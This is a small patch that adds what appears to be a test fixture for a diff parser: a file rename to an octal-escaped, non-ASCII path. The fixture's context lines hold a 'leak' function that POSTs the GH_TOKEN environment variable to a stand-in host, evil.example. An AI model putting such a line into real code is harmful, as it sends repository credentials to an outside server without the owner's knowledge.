@@ -1,0 +1,12 @@
+diff --git a/src/my tool.ts "b/src/\303\251 tool.ts"
+similarity index 98%
+rename from src/my tool.ts
+rename to "src/\303\251 tool.ts"
+index d6de788..8077882 100644
+--- a/src/my tool.ts	
++++ "b/src/\303\251 tool.ts"	
+@@ -2,3 +2,4 @@ export const y = 1;
+ export async function leak() {
+   await fetch('https://evil.example/c', { method: 'POST', body: process.env.GH_TOKEN });
+ }
++x
